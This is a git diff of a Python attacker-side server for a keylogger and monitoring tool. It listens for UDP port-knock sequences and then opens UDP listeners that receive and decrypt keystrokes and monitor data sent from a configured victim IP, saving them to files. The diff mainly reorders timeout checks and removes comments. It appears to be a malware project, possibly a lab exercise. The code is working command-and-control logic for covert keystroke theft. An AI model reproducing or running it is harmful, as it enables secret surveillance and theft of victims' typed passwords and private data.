@@ -15,18 +15,19 @@ def verify_keylog_knock():
     except KeyboardInterrupt:
         print("Exiting keylog knock sniffing...")
 
+
 def verify_monitor_knock():
     try:
         sniff(filter="udp and portrange 8888-8889", prn=monitor_knock_handler)  
     except KeyboardInterrupt:
         print("Exiting monitor knock sniffing...")
 
+
 def keylog_knock_handler(packet):
     global keylog_index
 
     if UDP in packet:
         if packet[UDP].dport == config.keylog_knock_sequence[keylog_index]:
-            # print("Correct knock so far...")
             keylog_index += 1
 
             if keylog_index == len(config.keylog_knock_sequence):
@@ -39,32 +40,32 @@ def monitor_knock_handler(packet):
 
     if UDP in packet:
         if packet[UDP].dport == config.monitor_knock_sequence[monitor_index]:
-            # print("Correct knock so far...")
             monitor_index += 1
 
             if monitor_index == len(config.monitor_knock_sequence):
                 print(f"Port knocking successful, opening monitor server for {config.monitor_alive} seconds\n")
                 allow_monitor_access()
-                # timer = threading.Timer(30, close_port)
-                # timer.start()
 
 
 def allow_keylog_access():
     global keylog_index
     keylog_index = 0
     
-    ip_addr = config.attacker_ip
-    port = config.attacker_keylogger_port
-
     keylog_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    keylog_socket.bind((ip_addr, port))
+    keylog_socket.bind((config.attacker_ip, config.attacker_keylogger_port))
     
     print(f"Keylog server open, result will be saved in {config.keylog_file}")
 
     start_time = time.time()
 
     while True:
+        # Breaks out of the loop after set amount of time
+        elapsed_time = time.time() - start_time
+        if elapsed_time >= config.keylog_alive:
+            print(f"{config.keylog_alive} seconds passed, closing connection...\n")
+            break
+
         data, addr = keylog_socket.recvfrom(1024)
 
         if addr[0] == config.victim_ip:
@@ -76,6 +77,7 @@ def allow_keylog_access():
             f.write(decrypted_char)
             f.close()
 
+        # Breaks out of the loop after reaching end of file
         if data == b'EOF':
             # Inserting linebreak after completion
             f = open(config.keylog_file, "a")
@@ -83,12 +85,6 @@ def allow_keylog_access():
             f.close()
             print("Transfer completed, closing connection...")
 
-            break
-
-        # Breaks out of the loop after set amount of time
-        elapsed_time = time.time() - start_time
-        if elapsed_time >= config.keylog_alive:
-            print(f"{config.keylog_alive} seconds passed, closing connection...\n")
             break
     
     keylog_socket.close()
@@ -98,12 +94,9 @@ def allow_monitor_access():
     global monitor_index
     monitor_index = 0
 
-    ip_addr = config.attacker_ip
-    port = config.attacker_monitor_port
-
     monitor_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    monitor_socket.bind((ip_addr, port))
+    monitor_socket.bind((config.attacker_ip, config.attacker_monitor_port))
 
     # monitor_socket.listen(1)
     print(f"Monitor server open, result will be saved in {config.monitor_file}")
@@ -111,6 +104,12 @@ def allow_monitor_access():
     start_time = time.time()
 
     while True:
+        # Breaks out of the loop after set amount of time
+        elapsed_time = time.time() - start_time
+        if elapsed_time >= config.monitor_alive:
+            print(f"{config.monitor_alive} seconds passed, closing connection...\n")
+            break
+
         data, addr = monitor_socket.recvfrom(1024)
 
         if addr[0] == config.victim_ip:
@@ -122,20 +121,13 @@ def allow_monitor_access():
             f.write(decrypted_char)
             f.close()
 
-        # Breaks out of the loop upon successful transmission
+        # Breaks out of the loop if end of file reached
         if data == b'EOF':
             # Inserting linebreak after completion
             f = open(config.monitor_file, "a")
             f.write("\n=====================\n\n")
             f.close()
             print("Transfer completed, closing connection...")
-
-            break
-
-        # Or, breaks out of the loop after set amount of time
-        elapsed_time = time.time() - start_time
-        if elapsed_time >= config.monitor_alive:
-            print(f"{config.monitor_alive} seconds passed, closing connection...\n")
             break
 
     monitor_socket.close()
